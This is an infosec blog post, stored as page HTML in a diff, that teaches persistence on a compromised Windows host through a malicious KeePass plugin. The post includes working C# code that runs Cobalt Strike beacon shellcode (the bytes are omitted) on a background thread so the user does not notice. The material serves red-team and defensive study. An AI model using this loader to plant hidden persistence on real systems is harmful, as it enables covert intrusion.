@@ -1,0 +1,366 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- layout.ejs-->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content="">
+    <meta name="author" content="two06">
+    <meta name="keyword" content="">
+    <link rel="canonical" href="https://blog.two06.info/two06.github.io/Persistence-with-KeePass-Part-1/">
+    <link rel="shortcut icon" href="https://cdn4.iconfinder.com/data/icons/ionicons/512/icon-person-128.png">
+    <link rel="alternate" type="application/atom+xml" title="Another Infosec Blog" href="/atom.xml">
+    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/animate.css/3.5.2/animate.min.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <link rel="stylesheet" href="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/themes/smoothness/jquery-ui.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js"></script>
+
+    <title>
+        
+        Persistence with KeePass - Part 1｜two06 Infosec Blog
+        
+    </title>
+
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+    
+<link rel="stylesheet" href="/two06.github.io/css/main.css">
+
+
+    
+      <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+      
+<link rel="stylesheet" href="/two06.github.io/css/highlight.css">
+
+    
+
+    
+
+
+    
+
+    
+
+    
+
+
+    
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+    
+
+
+
+
+    <script async defer src="https://buttons.github.io/buttons.js"></script>
+
+    <!-- user customization -->
+    
+<link rel="stylesheet" href="/two06.github.io/css/arsnippet.css">
+
+    
+<script src="/two06.github.io/js/arsnippet.css.js"></script>
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<style>
+    header.intro-header {
+        background-image: url('')
+    }
+</style>
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="" class="animated fadeIn">
+<header>
+  <nav class="navbar navbar-default header-navbar" id="nav-top" data-ispost = "true" data-istags="false" data-ishome = "false" >
+    <div class="container-fluid">
+      <div class="navbar-header page-scroll">
+        <button type="button" class="navbar-toggle" data-toggle="collapse" aria-expanded="false"  data-target="#website_navbar">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+        <span class="navbar-brand animated pulse">
+          <a class="brand-logo" href="/two06.github.io/">
+            Another Infosec Blog
+          </a>
+        </span>
+      </div>
+
+      <div class="collapse navbar-collapse" id="website_navbar">
+          <ul class="nav navbar-nav navbar-right">
+              
+                <li>
+                  <a href="/two06.github.io/">home</a>
+                </li>
+              
+                <li>
+                  <a href="/two06.github.io/Other-Research/">Other Research</a>
+                </li>
+              
+                <li>
+                  <a href="/two06.github.io/archives/">archives</a>
+                </li>
+              
+                <li>
+                  <a href="/two06.github.io/atom.xml">RSS</a>
+                </li>
+              
+          </ul>
+      </div>
+  </nav>
+
+
+  
+    <style>
+       .intro-header {
+          background-image: url('');
+      }
+    </style>
+
+    <div class="intro-header">
+        <div class="container">
+            <div class="row">
+                <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1 text-center">
+                    <div class="site-heading">
+                        <h1>Persistence with KeePass - Part 1</h1>
+                        
+                        
+                          <span class="meta">
+                               <span class="meta-item">Author: two06</span>
+                               <span class="meta-item">Date: Jun 30, 2019</span>
+                               
+                          </span>
+                          <!--<div class="tags text-center">
+                              Categories: 
+                          </div>-->
+                          <div class="tags text-center">
+                              Tags: 
+                              <a class="tag" href="/two06.github.io/tags/#Infosec"
+                                 title="Infosec">Infosec</a>
+                              
+                              <a class="tag" href="/two06.github.io/tags/#Persistence"
+                                 title="Persistence">Persistence</a>
+                              
+                              <a class="tag" href="/two06.github.io/tags/#Keepass"
+                                 title="Keepass">Keepass</a>
+                              
+                              <a class="tag" href="/two06.github.io/tags/#Cobalt Strike"
+                                 title="Cobalt Strike">Cobalt Strike</a>
+                              
+                              <a class="tag" href="/two06.github.io/tags/#Shellcode"
+                                 title="Shellcode">Shellcode</a>
+                              
+                          </div>
+                        
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+  
+</header>
+
+
+<!-- Main Content -->
+<!-- post.ejs -->
+<article>
+    <div class="container">
+      <div class="col-lg-8 col-lg-offset-1 col-sm-9">
+          
+          
+          <p>In this post we are going to look at a method of gaining persistence using KeePass. This approach requires permissions to write to wherever KeePass is installed, which is usually the Program Files directory (so local admin privs required). In part 2, we’ll look at a method which doesn’t have this restriction, but for now, lets get started.</p>
+<p>To follow along, you’ll need Visual Studio (or some other way to build .NET code), KeePass and a copy of the KeePass source code from <a href="https://keepass.info/download.html" target="_blank" rel="noopener">https://keepass.info/download.html</a>. You will also need the <a href="https://keepass.info/download.html" target="_blank" rel="noopener">portable</a> version of KeePass downloaded.</p>
+<p>KeePass supports plugins which allow users to expand the default functionality. You can find a list of publicly available ones on their <a href="https://keepass.info/plugins.html" target="_blank" rel="noopener">website</a>. KeePass is a .NET app, so there’s a good chance it’s using reflection to load its plugins. With the KeePass solution open in Visual Studio, searching for “reflection” soon confirms this suspicion. PluginManager.cs is referencing System.Reflection (as are a few other classes). Digging around in that class brings us to the CreatePluginInstance method:</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> Plugin <span class="title">CreatePluginInstance</span>(<span class="params"><span class="keyword">string</span> strFilePath,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">string</span> strTypeName</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Debug.Assert(strFilePath != <span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">if</span>(strFilePath == <span class="literal">null</span>) <span class="keyword">throw</span> <span class="keyword">new</span> ArgumentNullException(<span class="string">"strFilePath"</span>);</span><br><span class="line">    <span class="keyword">string</span> strType;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">string</span>.IsNullOrEmpty(strTypeName))</span><br><span class="line">    &#123;</span><br><span class="line">        strType = UrlUtil.GetFileName(strFilePath);</span><br><span class="line">        strType = UrlUtil.StripExtension(strType) + <span class="string">"."</span> +</span><br><span class="line">        UrlUtil.StripExtension(strType) + <span class="string">"Ext"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> strType = strTypeName + <span class="string">"."</span> + strTypeName + <span class="string">"Ext"</span>;</span><br><span class="line">    ObjectHandle oh = Activator.CreateInstanceFrom(strFilePath, strType);</span><br><span class="line">    Plugin plugin = (oh.Unwrap() <span class="keyword">as</span> Plugin);</span><br><span class="line">    <span class="keyword">if</span>(plugin == <span class="literal">null</span>) <span class="keyword">throw</span> <span class="keyword">new</span> FileLoadException();</span><br><span class="line">    <span class="keyword">return</span> plugin;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>This code ends up calling <a href="https://docs.microsoft.com/en-us/dotnet/api/system.activator.createinstancefrom?view=netframework-4.8" target="_blank" rel="noopener">Activator.CreateInstanceFrom</a> on a file path and creating a new Plugin object. We can confirm this by installing a plugin, placing a breakpoint on the Debug.Assert call and stepping through the code. It’s worth pointing out that running the app in debug mode means it wont read plugins from the standard directory, you can install one by clicking the “plugins” option under the tools menu and selecting “Open Folder”.</p>
+<p><img src="pluginlist.png" alt=""></p>
+<p>For this post, I’m using plugins with a .dll extension. Newer versions of KeePass also support PLGX files, which are compiled by KeePass itself, rather than being shipped as .dlls. We’ll take a look at these in a later post. For the next step I’m using DB_Backup for KeePass version 1.x. This is going to throw an error, but that doesn’t matter.</p>
+<p>You’ll need to re-run KeePass once you copy the plugin, as changes are picked up on load. With our breakpoint hit, we can see the strFilePath values is set to the path to our plugin DLL.</p>
+<p><img src="breakpoint1.png" alt=""></p>
+<p>Stepping over the code we eventually land on the call to Activator.CreateInstance().</p>
+<p><img src="breakpoint2.png" alt=""></p>
+<p>Letting this run will give us an error saying that this plugin isn’t compatible with KeePass 2 .x. That’s fine. We just wanted to see that our supplied .dll was being passed to Activator.CreateInstance().</p>
+<p>Let’s start building our own plugin. The KeePass <a href="https://keepass.info/help/v2_dev/plg_index.html" target="_blank" rel="noopener">website</a> provides the documentation we need to get started. There are a couple of important points:</p>
+<ul>
+<li>The namespace must match the dll name (minus the extension)</li>
+<li>The main class name must match the file name, with “Ext” appended</li>
+<li>The main class must inherit from KeePass.Plugins.Plugin</li>
+<li>Modify the Assembly Information to be “KeePass Plugin”</li>
+</ul>
+<p>With that in mind, lets start building our own plugin. In Visual Studio, create a new Class Library project using the .NET framework, giving it an appropriate name (I’m using “KeePassPersistence”).</p>
+<p>Next we need to rename the class to, in my case, KeePassPersistenceExt and reference the portable version of KeePass. We can also add the minimal plugin code from the KeePass <a href="https://keepass.info/%0D/help/v2_dev/plg_index.html#tutorial" target="_blank" rel="noopener">website</a>. You should end up with something resembling the following:</p>
+<p><img src="scafold1.png" alt=""></p>
+<p>We need to change the Assembly Information, which can be found under Properties -&gt; Application -&gt; Assembly Information and set the Product value to “KeePass Plugin”.</p>
+<p><img src="assemblyInfo.png" alt=""></p>
+<p>Lets build the solution and check our plugin works. We can use the plugins directory in the main KeePass installation folder from now on, which should be “C:\Program Files (x86)\KeePass Password Safe 2\Plugins”. Now if we run KeePass and look at the plugins menu, we should see our plugin listed.</p>
+<p><img src="pluginlist2.png" alt=""></p>
+<p>We now have a template that we can modify to run our code. Let’s change our code to execute a Cobalt Strike beacon. We can copy a template from <a href="https://github.com/two06/Inception" target="_blank" rel="noopener">Inception</a> and drop in our CS shellcode. The beacon shellcode is generated via the Attacks -&gt; Packages -&gt; Payload Generator menu.</p>
+<p>Out plugin class should now look something like this (I’ve removed the shellcode bytes to keep the size down):</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> KeePass.Plugins;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Reflection;</span><br><span class="line"><span class="keyword">using</span> System.Runtime.InteropServices;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">KeePassPersistence</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">KeePassPersistenceExt</span> : <span class="title">Plugin</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">bool</span> <span class="title">Initialize</span>(<span class="params">IPluginHost host</span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            Run();</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"kernel32.dll"</span>, SetLastError = true)</span>]</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">extern</span> <span class="keyword">bool</span> <span class="title">VirtualProtect</span>(<span class="params">IntPtr lpAddress, <span class="keyword">uint</span> dwSize, <span class="keyword">uint</span> flNewProtect, <span class="keyword">out</span> <span class="keyword">uint</span> lpflOldProtect</span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">delegate</span> <span class="keyword">uint</span> <span class="title">Ret1ArgDelegate</span>(<span class="params"><span class="keyword">uint</span> address</span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">static</span> <span class="keyword">uint</span> <span class="title">PlaceHolder1</span>(<span class="params"><span class="keyword">uint</span> arg1</span>)</span> &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] asmBytes = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">890</span>] &#123; &lt;shellcode&gt;&#125;;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">unsafe</span> <span class="keyword">void</span> <span class="title">Run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>        &#123;</span><br><span class="line">            <span class="keyword">fixed</span> (<span class="keyword">byte</span>* startAddress = &amp;asmBytes[<span class="number">0</span>]) <span class="comment">// Take the address of our x86 code</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// Get the FieldInfo for "_methodPtr"</span></span><br><span class="line">                Type delType = <span class="keyword">typeof</span>(Delegate);</span><br><span class="line">                FieldInfo _methodPtr = delType.GetField(<span class="string">"_methodPtr"</span>, BindingFlags.NonPublic |</span><br><span class="line">                BindingFlags.Instance);</span><br><span class="line">                <span class="comment">// Set our delegate to our x86 code</span></span><br><span class="line">                Ret1ArgDelegate del = <span class="keyword">new</span> Ret1ArgDelegate(PlaceHolder1);</span><br><span class="line">                _methodPtr.SetValue(del, (IntPtr)startAddress);</span><br><span class="line">                <span class="comment">//Disable protection</span></span><br><span class="line">                <span class="keyword">uint</span> outOldProtection;</span><br><span class="line">                VirtualProtect((IntPtr)startAddress, (<span class="keyword">uint</span>)asmBytes.Length, <span class="number">0x40</span>, <span class="keyword">out</span> outOldProtection);</span><br><span class="line">                <span class="comment">// Enjoy</span></span><br><span class="line">                <span class="keyword">uint</span> n = (<span class="keyword">uint</span>)<span class="number">0x00000001</span>;</span><br><span class="line">                n = del(n);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>As we are using the unsafe keyword, we have to change the build properties of the project to allow unsafe code. With that change made, we can build our DLL and try it out. Dropping the DLL into the plugins directory and launching KeePass should result in a beacon callback.</p>
+<p><img src="beacon.png" alt=""></p>
+<p>You might notice that KeePass doesn’t launch. That’s because we hijacked the plugins initialize method, which is called before the KeePass UI renders. Our shellcode doesn’t return control to the calling method, so KeePass never loads. We have persistence, but the user is going to notice something isn’t right.</p>
+<p>Luckily, fixing this is straight forward, we just need to run our payload on a new thread. We can add a using statement for System.Threading and change the Initialize method as follows:</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">override</span> <span class="keyword">bool</span> <span class="title">Initialize</span>(<span class="params">IPluginHost host</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    Thread thread = <span class="keyword">new</span> Thread(Run);</span><br><span class="line">    thread.Start();</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>Now when we run KeePass we get our beacon callback and the KeePass UI loads as normal. Just to show this is actually working, we can pop a message box from our beacon:</p>
+<p><img src="beacon2.png" alt=""></p>
+<p>Which is displayed over the KeePass UI.</p>
+<p><img src="ui.png" alt=""></p>
+<p>We now have a working persistence method using KeePass plugins.</p>
+<p>It’s worth pointing out that this isn’t as great as it seems. We need local admin permissions to write the plugin file and then we get a session back as a standard user. There are much better <a href="https://medium.com/@dmchell/persistence-the-continued-or-prolonged-existence-of-something-e29ea63e5c9a" target="_blank" rel="noopener">ways</a> to maintain persistence. In part two of this series we’ll look at a method which doesn’t need local admin.</p>
+<p>Finally, I want to stress that this isn’t a vulnerability in KeePass. KeePass are aware of the risks associated with malicious plugins, and have a section addressing them on their <a href="https://keepass.info/help/v2/plugins.html" target="_blank" rel="noopener">website</a>. This is just another way for an attacker to gain persistent access to an already compromised host.</p>
+
+          
+          <hr>
+          <ul class="pager">
+              
+              <li class="previous">
+                  <a href="/two06.github.io/Persistence-with-KeePass-Part-2/" data-toggle="tooltip" data-placement="left"
+                     title="Persistence with KeePass - Part 2">&larr; Previous Post</a>
+              </li>
+              
+              
+              <li class="next">
+                  <a href="/two06.github.io/Stealing-KeePass-Credentials-With-Frida/" data-toggle="tooltip" data-placement="top"
+                     title="Stealing KeePass Credentials With Frida">Next Post&rarr;</a>
+              </li>
+              
+          </ul>
+        
+  <br>
+  
+
+  
+  </div>
+
+
+        
+
+      </div>
+  </div>
+</article>
+
+<!-- Footer -->
+<!-- footer.ejs -->
+<footer>
+    <div class="text-center">
+      <ul class="list-inline">
+          
+              <li>
+                  <a href="/two06.github.io/atom.xml" target="_blank">
+                      <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
+                      </span>
+                  </a>
+              </li>
+          
+          
+              <li>
+                  <a target="_blank" href="https://twitter.com/two06">
+                      <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
+                      </span>
+                  </a>
+              </li>
+          
+          
+
+          
+
+          
+
+          
+              <li>
+                  <a target="_blank"  href="https://github.com/two06">
+                      <span class="fa-stack fa-lg">
+                          <i class="fa fa-circle fa-stack-2x"></i>
+                          <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                      </span>
+                  </a>
+              </li>
+          
+
+          
+
+          
+
+      </ul>
+     <div class="text-muted copyright">
+            &copy;
+            
+            2019 - 2020
+            
+            
+              <i class="fa fa-user"></i>
+            
+            two06
+        <br>
+          
+              Powered by <a target="_blank" href="https://hexo.io">Hexo</a>
+          
+          
+          
+          
+      </div>
+    </div>
+</footer>
+
+<!-- Custom Theme JavaScript -->
+
+<script src="/two06.github.io/js/main.js"></script>
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdn.bootcss.com/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+</body>
+
+</html>
